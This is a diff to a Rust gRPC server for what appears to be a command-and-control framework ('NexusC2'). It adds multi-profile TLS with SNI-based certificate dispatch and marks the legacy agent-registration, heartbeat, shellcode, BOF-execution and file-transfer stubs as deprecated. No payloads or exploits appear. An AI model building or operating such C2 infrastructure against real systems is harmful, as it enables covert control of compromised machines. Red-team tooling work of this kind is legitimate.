@@ -1,10 +1,11 @@
 //! gRPC server implementation with enhanced TLS and agent management
 
 use crate::{proto::*, CertManager, GrpcServerConfig, InfraError, InfraResult};
-use log::{debug, error, info, warn};
+use tracing::{debug, error, info, warn};
 use std::collections::HashMap;
 use std::net::SocketAddr;
 use std::sync::Arc;
+use tokio::net::TcpListener;
 use tokio::sync::RwLock;
 use tokio::time::Duration as TokioDuration;
 use tonic::{
@@ -119,62 +120,106 @@ impl GrpcServer {
             .parse()
             .map_err(|e| InfraError::GrpcError(format!("Invalid bind address: {}", e)))?;
 
-        // Create TLS identity from certificates
-        let cert_chain = self.cert_manager.get_certificate_chain();
-        let private_key = self.cert_manager.get_private_key();
-
-        if cert_chain.is_empty() {
-            return Err(InfraError::GrpcError(
-                "No certificate chain available".to_string(),
-            ));
-        }
-
-        let identity = Identity::from_pem(
-            &cert_chain[0].0, // Certificate
-            &private_key.0,   // Private key
-        );
-
-        // Configure server TLS
-        let tls_config = if self.config.mutual_tls {
-            info!("Configuring mutual TLS");
-            let ca_certs = self.cert_manager.get_ca_certificates();
-            if ca_certs.is_empty() {
-                warn!("Mutual TLS requested but no CA certificates available");
-                ServerTlsConfig::new().identity(identity)
-            } else {
-                ServerTlsConfig::new()
-                    .identity(identity)
-                    .client_ca_root(tonic::transport::Certificate::from_pem(&ca_certs[0].0))
-            }
-        } else {
-            ServerTlsConfig::new().identity(identity)
-        };
-
         // Create service implementation
         let service = NexusC2Service {
             agents: self.agents.clone(),
             task_manager: self.task_manager.clone(),
         };
 
-        // Build and start server
-        let server = Server::builder()
-            .tls_config(tls_config)
-            .map_err(|e| InfraError::TlsError(format!("TLS configuration failed: {}", e)))?
-            .tcp_keepalive(Some(TokioDuration::from_secs(
-                self.config.keepalive_interval,
-            )))
-            .max_concurrent_streams(Some(self.config.max_connections))
-            .add_service(nexus_c2_server::NexusC2Server::new(service))
-            .serve(addr);
+        if self.cert_manager.has_profiles() {
+            info!("Multi-profile TLS: using custom cert resolver with SNI dispatch");
+            let tls_acceptor = self
+                .cert_manager
+                .create_multi_profile_tls_acceptor(self.config.mutual_tls)?;
 
-        // Spawn server task
-        let handle = tokio::spawn(async move {
-            if let Err(e) = server.await {
-                error!("gRPC server error: {}", e);
+            let listener = TcpListener::bind(&addr)
+                .await
+                .map_err(|e| InfraError::GrpcError(format!("Failed to bind: {}", e)))?;
+
+            let incoming = async_stream::stream! {
+                loop {
+                    match listener.accept().await {
+                        Ok((tcp_stream, _peer_addr)) => {
+                            match tls_acceptor.accept(tcp_stream).await {
+                                Ok(tls_stream) => yield Ok::<_, std::io::Error>(tls_stream),
+                                Err(e) => {
+                                    warn!("TLS handshake failed: {}", e);
+                                    continue;
+                                }
+                            }
+                        }
+                        Err(e) => {
+                            error!("TCP accept failed: {}", e);
+                            break;
+                        }
+                    }
+                }
+            };
+
+            let keepalive = self.config.keepalive_interval;
+            let max_conn = self.config.max_connections;
+            let handle = tokio::spawn(async move {
+                let server = Server::builder()
+                    .tcp_keepalive(Some(TokioDuration::from_secs(keepalive)))
+                    .max_concurrent_streams(Some(max_conn))
+                    .add_service(nexus_c2_server::NexusC2Server::new(service))
+                    .serve_with_incoming(incoming);
+
+                if let Err(e) = server.await {
+                    error!("gRPC server error: {}", e);
+                }
+            });
+
+            *self.server_handle.write().await = Some(handle);
+        } else {
+            // Single-cert path (unchanged)
+            let cert_chain = self.cert_manager.get_certificate_chain();
+            let private_key = self.cert_manager.get_private_key();
+
+            if cert_chain.is_empty() {
+                return Err(InfraError::GrpcError(
+                    "No certificate chain available".to_string(),
+                ));
             }
-        });
 
-        *self.server_handle.write().await = Some(handle);
+            let identity = Identity::from_pem(
+                &cert_chain[0].0, // Certificate
+                &private_key.0,   // Private key
+            );
+
+            let tls_config = if self.config.mutual_tls {
+                info!("Configuring mutual TLS");
+                let ca_certs = self.cert_manager.get_ca_certificates();
+                if ca_certs.is_empty() {
+                    warn!("Mutual TLS requested but no CA certificates available");
+                    ServerTlsConfig::new().identity(identity)
+                } else {
+                    ServerTlsConfig::new()
+                        .identity(identity)
+                        .client_ca_root(tonic::transport::Certificate::from_pem(&ca_certs[0].0))
+                }
+            } else {
+                ServerTlsConfig::new().identity(identity)
+            };
+
+            let server = Server::builder()
+                .tls_config(tls_config)
+                .map_err(|e| InfraError::TlsError(format!("TLS configuration failed: {}", e)))?
+                .tcp_keepalive(Some(TokioDuration::from_secs(
+                    self.config.keepalive_interval,
+                )))
+                .max_concurrent_streams(Some(self.config.max_connections))
+                .add_service(nexus_c2_server::NexusC2Server::new(service))
+                .serve(addr);
+
+            let handle = tokio::spawn(async move {
+                if let Err(e) = server.await {
+                    error!("gRPC server error: {}", e);
+                }
+            });
+
+            *self.server_handle.write().await = Some(handle);
+        }
 
         info!("gRPC server started successfully on {}", addr);
         Ok(())
@@ -249,6 +294,10 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
 
         info!("Registering new agent: {} from {}", agent_id, req.hostname);
 
+        // NOTE(v1.5): These RPC stubs are part of the legacy nexus.v1 service.
+        // The A2A plane (nexus-a2a) handles all active traffic. These return
+        // empty/default responses and will be removed when v1 is decommissioned.
+
         // Create agent session
         let session = AgentSession {
             agent_id: agent_id.clone(),
@@ -267,8 +316,8 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
             agent_id: agent_id.clone(),
             success: true,
             message: "Agent registered successfully".to_string(),
-            assigned_domains: vec![], // TODO: Provide fallback domains
-            config: None,             // TODO: Provide initial configuration
+            assigned_domains: vec![], // DEPRECATED(v1): Provide fallback domains
+            config: None,             // DEPRECATED(v1): Provide initial configuration
         };
 
         info!("Agent {} registered successfully", agent_id);
@@ -313,7 +362,7 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
             let response = HeartbeatResponse {
                 success: true,
                 heartbeat_interval: 30, // 30 seconds
-                new_domains: vec![],    // TODO: Provide domain rotation
+                new_domains: vec![],    // DEPRECATED(v1): Provide domain rotation
                 config_update: None,
             };
 
@@ -340,7 +389,7 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
                     seconds: agent.last_heartbeat.timestamp(),
                     nanos: 0,
                 }),
-                current_status: None, // TODO: Implement system status
+                current_status: None, // DEPRECATED(v1): Implement system status
                 active_tasks: agent.pending_tasks.keys().cloned().collect(),
                 is_online: agent.is_active,
             };
@@ -428,7 +477,7 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
             chunks.len()
         );
 
-        // TODO: Store file data
+        // DEPRECATED(v1): Store file data
         let file_id = Uuid::new_v4().to_string();
 
         let response = FileUploadResponse {
@@ -452,7 +501,7 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
             req.file_path, req.agent_id
         );
 
-        // TODO: Load file data and create chunks
+        // DEPRECATED(v1): Load file data and create chunks
         // For now, return a single Unavailable item so the stream type is concrete.
         let output_stream = async_stream::stream! {
             yield Err::<FileChunk, Status>(Status::unimplemented("download_file not implemented"));
@@ -470,7 +519,7 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
 
         info!("Shellcode execution requested for agent: {}", req.agent_id);
 
-        // TODO: Queue shellcode execution task
+        // DEPRECATED(v1): Queue shellcode execution task
         let response = ShellcodeResponse {
             success: true,
             message: "Shellcode execution queued".to_string(),
@@ -492,7 +541,7 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
             req.agent_id, req.function_name
         );
 
-        // TODO: Queue BOF execution task
+        // DEPRECATED(v1): Queue BOF execution task
         let response = BofResponse {
             success: true,
             message: "BOF execution queued".to_string(),
@@ -574,6 +623,7 @@ mod tests {
             ca_cert_path: temp_dir.path().join("ca.pem"),
             pin_validation: true,
             validity_days: 365,
+            profiles: None,
         };
 
         // Generate test certificates
